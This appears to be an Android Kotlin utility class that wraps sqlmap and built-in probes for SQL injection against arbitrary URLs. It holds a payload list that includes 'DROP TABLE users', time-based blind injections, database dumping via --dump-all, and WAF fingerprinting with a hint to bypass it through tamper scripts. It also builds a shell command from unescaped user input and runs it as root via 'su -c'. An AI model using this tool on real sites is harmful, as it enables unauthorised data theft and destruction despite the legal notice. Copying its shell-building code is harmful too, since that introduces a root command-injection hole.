package com.example.utils

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn

/**
 * SqlMapRunner — SQL injection testing utility.
 *
 * LEGAL NOTICE: Only test on applications you own or have explicit written permission to test.
 *
 * Uses:
 * 1. sqlmap binary if installed (Termux/NetHunter)
 * 2. Built-in basic SQLi detection probes as fallback
 */
class SqlMapRunner {

    companion object {
        private val SQLMAP_PATHS = listOf(
            "/data/data/com.termux/files/usr/bin/sqlmap",
            "/data/local/tmp/sqlmap",
            "/usr/bin/sqlmap",
            "/system/bin/sqlmap"
        )

        // Common SQL injection payloads for basic detection
        val BASIC_PAYLOADS = listOf(
            "'",
            "''",
            "`",
            "\"",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "1; DROP TABLE users --",
            "1 UNION SELECT NULL --",
            "1 UNION SELECT NULL,NULL --",
            "1 AND 1=1",
            "1 AND 1=2",
            "' AND '1'='1",
            "admin'--",
            "admin' #",
            "') OR ('1'='1",
            "1' AND SLEEP(5) --",
            "1; WAITFOR DELAY '0:0:5' --"
        )

        // Error signatures indicating SQLi vulnerability
        val ERROR_SIGNATURES = listOf(
            "mysql_fetch_array",
            "ORA-00933",
            "Microsoft OLE DB",
            "ODBC SQL Server",
            "SQLServer JDBC",
            "PostgreSQL query failed",
            "Warning: mysql",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "check the manual that corresponds to your MySQL server version",
            "You have an error in your SQL syntax",
            "Unclosed quotation mark",
            "quoted string not properly terminated",
            "SQLite3::query",
            "pg_exec",
            "supplied argument is not a valid MySQL",
            "Warning: pg_",
            "Sybase message:",
            "OLE DB provider for SQL Server"
        )
    }

    fun findSqlmap(): String? = SQLMAP_PATHS.firstOrNull { java.io.File(it).exists() }

    /**
     * Run full sqlmap scan against a URL.
     */
    fun runSqlmap(
        targetUrl: String,
        data: String? = null,
        dumpAll: Boolean = false,
        level: Int = 3,
        risk: Int = 2,
        dbms: String? = null,
        cookie: String? = null,
        extraArgs: String = ""
    ): Flow<String> = flow {
        emit("=" .repeat(55))
        emit("  SQLMAP — SQL Injection Tester")
        emit("=" .repeat(55))
        emit("[!] LEGAL: Only test with explicit authorization!")
        emit("")

        val sqlmapPath = findSqlmap()

        if (sqlmapPath == null) {
            emit("[INFO] sqlmap binary not found. Using built-in probes.")
            emit("[INFO] To install sqlmap:")
            emit("[INFO]   Termux: pkg install python && pip install sqlmap")
            emit("[INFO]   Or place sqlmap at /data/local/tmp/sqlmap")
            emit("")
            // Fall back to built-in detection
            runBuiltInSqliDetection(targetUrl, data).collect { emit(it) }
            return@flow
        }

        emit("[+] Found sqlmap: $sqlmapPath")
        emit("")

        val cmd = buildString {
            append("python3 $sqlmapPath")
            append(" -u \"$targetUrl\"")
            if (data != null) append(" --data \"$data\"")
            if (dumpAll) append(" --dump-all")
            if (dbms != null) append(" --dbms=$dbms")
            if (cookie != null) append(" --cookie=\"$cookie\"")
            append(" --level=$level --risk=$risk")
            append(" --batch --random-agent")
            append(" --answers=\"quit=N,crack=Y,flush=Y\"")
            if (extraArgs.isNotEmpty()) append(" $extraArgs")
        }

        emit("[*] Command: $cmd")
        emit("")

        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            val reader = process.inputStream.bufferedReader()
            val errReader = process.errorStream.bufferedReader()

            var line: String? = null
            while (true) {
                line = reader.readLine() ?: break
                emit(line)
            }
            while (true) {
                line = errReader.readLine() ?: break
                if (line.isNotBlank()) emit("[ERR] $line")
            }

            val exitCode = process.waitFor()
            emit("")
            emit("[*] sqlmap exited with code: $exitCode")
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Built-in basic SQL injection probe (no binary required).
     */
    fun runBuiltInSqliDetection(targetUrl: String, postData: String? = null): Flow<String> = flow {
        emit("[*] Running built-in SQLi detection probes...")
        emit("[*] Target: $targetUrl")
        emit("[*] Method: ${if (postData != null) "POST" else "GET"}")
        emit("")

        var vulnerable = false
        var tested = 0

        for (payload in BASIC_PAYLOADS) {
            val testUrl = if (postData == null) {
                // Append payload to URL params
                if (targetUrl.contains("?")) "$targetUrl$payload"
                else "$targetUrl?id=$payload"
            } else targetUrl

            tested++
            emit("[TRY] Payload: ${payload.take(40)}")

            try {
                val url = java.net.URL(testUrl)
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.apply {
                    requestMethod = if (postData != null) "POST" else "GET"
                    connectTimeout = 8000
                    readTimeout = 8000
                    setRequestProperty("User-Agent",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
                    if (postData != null) {
                        doOutput = true
                        val body = "${postData}${payload}".toByteArray()
                        outputStream.write(body)
                    }
                }

                val response = try {
                    conn.inputStream.bufferedReader().readText()
                } catch (e: Exception) {
                    conn.errorStream?.bufferedReader()?.readText() ?: ""
                }

                // Check for SQL error signatures
                val foundError = ERROR_SIGNATURES.firstOrNull { sig ->
                    response.contains(sig, ignoreCase = true)
                }

                if (foundError != null) {
                    vulnerable = true
                    emit("[VULN] ✓ SQL ERROR DETECTED!")
                    emit("[VULN] Error signature: $foundError")
                    emit("[VULN] Payload: $payload")
                    emit("[VULN] Target appears to be vulnerable to SQL injection!")
                    emit("")
                }

                // Check for timing-based (delayed response > 4s)
                val startTime = System.currentTimeMillis()
                conn.responseCode
                val elapsed = System.currentTimeMillis() - startTime
                if (elapsed > 4000 && payload.contains("SLEEP")) {
                    vulnerable = true
                    emit("[VULN] ✓ TIME-BASED BLIND SQLi DETECTED!")
                    emit("[VULN] Response delayed ${elapsed}ms with SLEEP payload")
                    emit("[VULN] Payload: $payload")
                }

                conn.disconnect()
            } catch (e: java.net.ConnectException) {
                emit("[ERROR] Cannot connect to target")
                break
            } catch (e: Exception) {
                // Continue probing
            }
        }

        emit("")
        emit("=" .repeat(50))
        emit("[SUMMARY] Tested: $tested payloads")
        emit("[SUMMARY] Vulnerable: ${if (vulnerable) "YES ⚠️" else "NO — Appears safe"}")
        if (vulnerable) {
            emit("[INFO] Next steps:")
            emit("[INFO]   sqlmap -u \"$targetUrl\" --dbs")
            emit("[INFO]   sqlmap -u \"$targetUrl\" --dump-all")
        }
        emit("=" .repeat(50))
    }.flowOn(Dispatchers.IO)

    /**
     * Quick WAF (Web Application Firewall) detection.
     */
    fun detectWaf(targetUrl: String): Flow<String> = flow {
        emit("[*] WAF Detection for: $targetUrl")
        emit("")

        try {
            val url = java.net.URL(targetUrl)
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.apply {
                requestMethod = "GET"
                connectTimeout = 8000
                setRequestProperty("User-Agent",
                    "Mozilla/5.0 sqlmap/1.7")
            }

            val code = conn.responseCode
            val headers = conn.headerFields

            val wafHeaders = mapOf(
                "x-sucuri-id" to "Sucuri WAF",
                "x-fw-hash" to "Fortinet FortiWeb",
                "x-protected-by" to "Generic WAF",
                "cf-ray" to "Cloudflare",
                "x-akamai-transformed" to "Akamai",
                "x-waf-status" to "WAF",
                "server" to "ModSecurity",
                "x-mod-pagespeed" to "ModSecurity"
            )

            val detected = mutableListOf<String>()
            for ((headerName, wafName) in wafHeaders) {
                val headerValue = headers[headerName]?.firstOrNull()?.lowercase() ?: ""
                if (headerValue.isNotEmpty()) {
                    detected.add("$wafName (header: $headerName: $headerValue)")
                }
            }

            emit("[+] HTTP Status: $code")
            emit("[+] Server: ${headers["server"]?.firstOrNull() ?: "Unknown"}")
            emit("")

            if (detected.isEmpty()) {
                emit("[WAF] No WAF signature detected — may be unprotected or stealth WAF")
            } else {
                emit("[WAF] ⚠️ WAF Detected:")
                detected.forEach { emit("[WAF]   $it") }
                emit("[INFO] Use --tamper scripts with sqlmap to bypass WAF")
            }

            conn.disconnect()
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)
}
